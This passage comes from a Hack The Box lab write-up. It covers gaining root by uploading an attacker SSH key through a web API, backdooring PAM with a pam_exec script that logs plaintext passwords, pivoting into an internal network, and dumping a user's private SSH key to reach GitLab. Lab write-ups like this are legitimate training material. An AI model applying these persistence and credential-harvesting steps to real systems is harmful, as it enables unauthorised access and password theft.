ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxDmbQMULuit3J2bu/cA5lFeDK4O74KQC/alZufdUPypHPdRC8l3FL6QqxR8dnjyBu6vle5sUo3L1yviydu4RdwBvmVoV7dWSLjBOSCfDAdik8jYNChZWs8KPMHd/zNIgHPJlZN8AWyctAxprUyHbl8YXGh+5/4XV3EWD3xmYACBzDaHS6ww3Yi0qHpZgDTjzavvCChYCXb9Wu5PIMs7Gfo/ZyYBTMfhKV6rIt5QOta3VP00g4xsLDqVgZN4zbk8aJw9HeZDr5YyI0SU6gNmbG51wgFARDzazgOf0hqScUEFnppIFfAuTFmnFi/RjPlzF75TuEVdhlHGR18oUrOTGHf0LGgVFqTgfEelBobeHDepC9h0qkK0eSFBVgNdgYIegBW2Hbwg65TJtEEcGHpioZ7m8ntpHhbK72E0v/lgjMs+8yNC8sHLaI9p6S2RX2D4vxj+hA0snGlskhLDAjiCPD0xlZa7obmn81RE0GhwRkzzkih4OqnXbbPlOh0fQ+DbJWk8P6C82YhrhjOJzAH2IFHeLCn7jsvwSNr72MGWGbogIGA9cXbSAPcpwPqBZGmWZ+U3DTznmWQBopNE6A8V6mRZvy1R+hdAe+lD14pjJdMzTM38tnhOkV/Uk1+Ywb4fwIFPBpWrPzBSWpb6jE29HDv3DIb81kZ52Fv5AzgWbEBw== user@kali-almi

```

And now I can upload it thru the webpage:

```http
POST /api/v1/file/upload HTTP/1.1
Host: 10.10.110.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.110.20/
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzc2OTM5NjE0LCJpYXQiOjE3NzYyNDg0MTQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiJmNjI3ODhhMC03MWEzLTRjMjMtOTBlNy03ZGM2ZTQ1OWM0MjIifQ.2CazPhl9NkEHb5KFSEeqonHutFmnngj-g3p-XVI2jVw
Content-Type: multipart/form-data; boundary=----geckoformboundary9af75c2073169fa45d1628d11acdb69b
Content-Length: 1812
Origin: http://10.10.110.20
Connection: keep-alive
Priority: u=4

------geckoformboundary9af75c2073169fa45d1628d11acdb69b
Content-Disposition: form-data; name="file"; filename="evil_link"
Content-Type: text/plain

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDC56T+CJsldompfPq4RnGd94aC5/SDk0Oi16blt+zPzMGJpJSlKXNHc9AJGl8qagziNY8C+Y8tYnUF2YNaxsiSVSizD07tvGkgxapqRJ0x9mVVikdQJdfE9CAQCcE1RaJ7KtMsvAdc5eqRTsmX5EXicaEIAQmJ0pbiOVfe5uIGHQd7BRdT5GpHa9VQthR+EAavZhht28S4anOtsN5J27rmRDO51qiGAD6jyv1h/0lmp6Ql2QbDf6gFaUONg4nEEYy7HFTM1+fMtcNEIJe2ClOyYCAzsX8V9HzyVJQG/hqkaYYY80/FoPDeBi5Eso8Z4AISEUxNlPvaOSIxiPuZ2sQbrqPuN+gHgquKip37jxPE2HDfSmU2uMWQ8ue6Xj+Dk6ZaeabpmggO5PKfXkuAZkIXmyZm8GluMwahvCIsVJKy2+H87wLu+RCOGA3sPKN0OyXolFMSKaXaYea67445G7nzCpY2bn6vAKsjQALu5hUkh7UNxdBAO7n0b+lakHmvm25kzQ7QJe55OkWD16DHaH46uadn46OBMbHeaaukzgF/EYK8S4ji2ab8N3z4B7uD4o9XaFaYtpnzvv/5/7SwtEDSZD6Z7IHIUeYJSOOPuu1H6tys7ZAEj+wuRAJ0/BhvD+UEq/VKlWFAhKAfeOffa3KExWlbpKphVPbubzQjODLEvQ== user@kali-almi


------geckoformboundary9af75c2073169fa45d1628d11acdb69b
Content-Disposition: form-data; name="fileContents"

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDC56T+CJsldompfPq4RnGd94aC5/SDk0Oi16blt+zPzMGJpJSlKXNHc9AJGl8qagziNY8C+Y8tYnUF2YNaxsiSVSizD07tvGkgxapqRJ0x9mVVikdQJdfE9CAQCcE1RaJ7KtMsvAdc5eqRTsmX5EXicaEIAQmJ0pbiOVfe5uIGHQd7BRdT5GpHa9VQthR+EAavZhht28S4anOtsN5J27rmRDO51qiGAD6jyv1h/0lmp6Ql2QbDf6gFaUONg4nEEYy7HFTM1+fMtcNEIJe2ClOyYCAzsX8V9HzyVJQG/hqkaYYY80/FoPDeBi5Eso8Z4AISEUxNlPvaOSIxiPuZ2sQbrqPuN+gHgquKip37jxPE2HDfSmU2uMWQ8ue6Xj+Dk6ZaeabpmggO5PKfXkuAZkIXmyZm8GluMwahvCIsVJKy2+H87wLu+RCOGA3sPKN0OyXolFMSKaXaYea67445G7nzCpY2bn6vAKsjQALu5hUkh7UNxdBAO7n0b+lakHmvm25kzQ7QJe55OkWD16DHaH46uadn46OBMbHeaaukzgF/EYK8S4ji2ab8N3z4B7uD4o9XaFaYtpnzvv/5/7SwtEDSZD6Z7IHIUeYJSOOPuu1H6tys7ZAEj+wuRAJ0/BhvD+UEq/VKlWFAhKAfeOffa3KExWlbpKphVPbubzQjODLEvQ== user@kali-almi


------geckoformboundary9af75c2073169fa45d1628d11acdb69b--

```

And now I am root:  
![6aabfbcd8809bcf4de2cc5e48c59b543.png](../../../_resources/6aabfbcd8809bcf4de2cc5e48c59b543.png)

And get a new flag:

```bash
root@fts01:~# cat flag.txt 
HTB{ba2a51a204f4a4c686f877a02d85fbdd}root@fts01:~# 
root@fts01:~# 

```

Now the idea is to tamper the PAM to write the password to a logfile, so first you need to add this script:

```bash
root@fts01:/tmp# ll
total 1004
drwxrwxrwt 12 root  root    4096 Apr 14 10:24 ./
drwxr-xr-x 18 root  root    4096 Mar 17  2025 ../
drwxrwxrwt  2 root  root    4096 Apr 14 02:13 .ICE-unix/
drwxrwxrwt  2 root  root    4096 Apr 14 02:13 .Test-unix/
drwxrwxrwt  2 root  root    4096 Apr 14 02:13 .X11-unix/
drwxrwxrwt  2 root  root    4096 Apr 14 02:13 .XIM-unix/
drwxrwxrwt  2 root  root    4096 Apr 14 02:13 .font-unix/
-rwxrwxr-x  1 katja katja 971926 Apr 14 08:33 linpeas.sh*
drwx------  3 root  root    4096 Apr 14 02:13 systemd-private-1d31c47ded5641c096958fbbbdec8a5e-fts-api.service-utln1x/
drwx------  3 root  root    4096 Apr 14 02:13 systemd-private-1d31c47ded5641c096958fbbbdec8a5e-systemd-logind.service-qY4Wvo/
drwx------  3 root  root    4096 Apr 14 02:13 systemd-private-1d31c47ded5641c096958fbbbdec8a5e-systemd-resolved.service-HdVS1m/
drwx------  3 root  root    4096 Apr 14 02:13 systemd-private-1d31c47ded5641c096958fbbbdec8a5e-systemd-timesyncd.service-VC9roT/
-rwx------  1 root  root      91 Apr 14 10:24 toomanysecrets.sh*
drwx------  2 root  root    4096 Apr 14 02:13 vmware-root_736-2991268455/
root@fts01:/tmp# cat toomanysecrets.sh 
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /tmp/toomanysecrets.log
root@fts01:/tmp# 


```

Next, you need to edit the pam common auth file to execute the script:

```bash
#
# /etc/pam.d/common-auth - authentication settings common to all services
#
# This file is included from other service-specific PAM config files,
# and should contain a list of the authentication modules that define
# the central authentication scheme for use on the system
# (e.g., /etc/shadow, LDAP, Kerberos, etc.).  The default is to use the
# traditional Unix authentication mechanisms.
#
# As of pam 1.0.1-6, this file is managed by pam-auth-update by default.
# To take advantage of this, it is recommended that you configure any
# local modules either before or after the default block, and use
# pam-auth-update to manage selection of other modules.  See
# pam-auth-update(8) for details.

# here are the per-package modules (the "Primary" block)
auth    [success=1 default=ignore]      pam_unix.so nullok
# here's the fallback if no module succeeds
auth    requisite                       pam_deny.so
# prime the stack with a positive return value if there isn't one already;
# this avoids us returning an error just because nothing sets a success code
# since the modules above will each just jump around
auth    required                        pam_permit.so
# and here are more per-package modules (the "Additional" block)
auth    optional                        pam_cap.so
# end of pam-auth-update config
auth optional pam_exec.so quiet expose_authtok /tmp/toomanysecrets.sh

```

&nbsp;And now I have some credentials as well:

```bash
root@fts01:/tmp# cat toomanysecrets.log 
 Tue Apr 14 10:27:05 UTC 2026 benny, BootRiders4Life!, From: 172.16.0.22
root@fts01:/tmp# 

```

# Internal network enumeration

Now I will setup a ligolo and perform a quick scan over the internal NIC:

![9d5614dc59fff76e6d976b6357a6e6bf.png](../../../_resources/9d5614dc59fff76e6d976b6357a6e6bf.png)

And this is a ping sweep of all the open services so far:

```bash
─$ fping -asqg 172.16.0.0/24
172.16.0.1
172.16.0.3
172.16.0.5
172.16.0.6
172.16.0.22
172.16.0.100
172.16.0.150
172.16.0.254

     254 targets
       8 alive
     246 unreachable
       0 unknown addresses

     984 timeouts (waiting for response)
     992 ICMP Echos sent
       8 ICMP Echo Replies received
       0 other ICMP received

 26.4 ms (min round trip time)
 28.5 ms (avg round trip time)
 31.1 ms (max round trip time)
        9.732 sec (elapsed real time)

```

Check the singular pages, for the values so far.

# Post exploitation

Now I almost missed but apparently the user Katja has some ssh key to Ansible and gitlab?

```bash
root@fts01:/home/katja/.ssh# cat config 
# BEGIN ANSIBLE MANAGED BLOCK: gitlab.wanderer.htb
Host gitlab.wanderer.htb
  PreferredAuthentications publickey
  IdentityFile ~/.ssh/id_ed25519
# END ANSIBLE MANAGED BLOCK: gitlab.wanderer.htb
root@fts01:/home/katja/.ssh# cat id_ed25519 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDxAlRpjBKbXJLiqH7qkhG4bslpURC4GzayG9DZvG8hoAAAAJDcGGs/3Bhr
PwAAAAtzc2gtZWQyNTUxOQAAACDxAlRpjBKbXJLiqH7qkhG4bslpURC4GzayG9DZvG8hoA
AAAECes9lJS2BHYpcvHkzFj31E+p9xRNPoo3HNBdg3uBvwavECVGmMEptckuKofuqSEbhu
yWlRELgbNrIb0Nm8byGgAAAADWlwcHNlY0BwYXJyb3Q=
-----END OPENSSH PRIVATE KEY-----
root@fts01:/home/katja/.ssh# 

```

Now this might be used on the Gitlab machine but i see some old hosts as well:

```bash
root@fts01:/home/katja/.ssh# cat known_hosts
|1|oUGbvr1ow9CQkuLq3XimoLDaKg4=|bqFCqn+zpIeWwAALzGBfXJrQPUE= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/KfVO1HT87Y/kPDJ+9emwpl4YAr1/vize6pOO1yyE1
|1|TVO+x+0E+7mElJ/g20liUKoWMhs=|gRKqeCbR43gKMkVSBk0I+OtA/Js= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILk5s0dksKTvOZNqHLjGYQGoMKG557DlKZPfv1jcZGoa
|1|cCwbyDhNWDmBMt8IiHEZ/QQvqnA=|lBW9G9K5t1WFMoVyd/p6YuoYziY= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3f4SfPgr9nCny1UPm8zRHrMhxPGKteLtCPvTKkNdkTjTUWXOIEJTM5BGaLfzmRbpbOeeceqXLxFuzA2MMw1tcpQiEbLXHFsJBiONv2Awt3GrYoJPfFdVN8IQAx9nC57sz7DcRk0n+wLjZRsnej1JhIlru7M1XV3eLwCY8chkoxfjS11FsbCWh3jO1qkIqh02M8F4fofdSw+ZRlpqoyI+ZVA9Pce7yqJUftJ8AMtj+BiXbRPdy4XOh2i1DI2v11ieeZS48ZSxSS1j2HAZS80WpxlVORJkrFn3Rb/td06of05raVTdoVzqsMN6EP43U/XIj9er+hEEi1co/UqUVJUum44Bk/sdCITzHD2wWwMnOOTGArs5CYPyZp39FC6GS1qjhWQdIdFO6TyrLRkFwmO6G/AiintmRXPlGNqAw+utF+gAQTL612mpVt+pzFgHkY0IIuVyUStUjuKu40XIU2Zhf6+481mngqalx99QeFugkfO/AFf5N6DymqOEsnuH9tvk=
|1|dQIwKrTcBR3Dc7DpkFddmmqJSIY=|RRLyVvF+us3TP8SCTVL9bTSLRKs= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMNvF7Jf2lWFZSmRf5+xblZUcuxitJelSWrhIAnCewL8XwV4uQnMm4W0gvvjTOMccSqDPZrd6E9AcfQqnC9F9o=
root@fts01:/home/katja/.ssh# cat known_hosts.old 
|1|oUGbvr1ow9CQkuLq3XimoLDaKg4=|bqFCqn+zpIeWwAALzGBfXJrQPUE= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/KfVO1HT87Y/kPDJ+9emwpl4YAr1/vize6pOO1yyE1
|1|TVO+x+0E+7mElJ/g20liUKoWMhs=|gRKqeCbR43gKMkVSBk0I+OtA/Js= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILk5s0dksKTvOZNqHLjGYQGoMKG557DlKZPfv1jcZGoa
root@fts01:/home/katja/.ssh# 


```

Now this is usefull to get the list of connected hosts:

```bash
root@fts01:/home/katja/.ssh# ssh-keygen -lf /home/katja/.ssh/known_hosts
256 SHA256:NQ9hjiekuCs12gTjZMPW1gSni+ZPzDdv8eWspKE44uM |1|oUGbvr1ow9CQkuLq3XimoLDaKg4=|bqFCqn+zpIeWwAALzGBfXJrQPUE= (ED25519)
256 SHA256:bKMUgp1sq353eQ8UdGJdM5ebI8NseFGh5JlbovWGMDs |1|TVO+x+0E+7mElJ/g20liUKoWMhs=|gRKqeCbR43gKMkVSBk0I+OtA/Js= (ED25519)
3072 SHA256:zZd3ogkg16BSBy2Khj7mypffnW5MK1rFzlAGvEQMSAs |1|cCwbyDhNWDmBMt8IiHEZ/QQvqnA=|lBW9G9K5t1WFMoVyd/p6YuoYziY= (RSA)
256 SHA256:mjZqu+3WfB/GJO3OLzhvcNYUYuTGspVIk/+8P/HVqsM |1|dQIwKrTcBR3Dc7DpkFddmmqJSIY=|RRLyVvF+us3TP8SCTVL9bTSLRKs= (ECDSA)
root@fts01:/home/katja/.ssh# 
root@fts01:/home/katja/.ssh# 
root@fts01:/home/katja/.ssh# 
root@fts01:/home/katja/.ssh# 
root@fts01:/home/katja/.ssh# ssh-keygen -lf /home/katja/.ssh/known_hosts.old 
256 SHA256:NQ9hjiekuCs12gTjZMPW1gSni+ZPzDdv8eWspKE44uM |1|oUGbvr1ow9CQkuLq3XimoLDaKg4=|bqFCqn+zpIeWwAALzGBfXJrQPUE= (ED25519)
256 SHA256:bKMUgp1sq353eQ8UdGJdM5ebI8NseFGh5JlbovWGMDs |1|TVO+x+0E+7mElJ/g20liUKoWMhs=|gRKqeCbR43gKMkVSBk0I+OtA/Js= (ED25519)
root@fts01:/home/katja/.ssh# 

```

Now this keys seems only from Gitlab for the user katja , most likely it is used to push/pull from the repository instead of using the https protocoll:

```bash
└─$ ssh -i katja_gitlab.key git@gitlab.wanderer.htb
PTY allocation request failed on channel 0
Welcome to GitLab, @katja!
Connection to gitlab.wanderer.htb closed.
                                              
                                              
```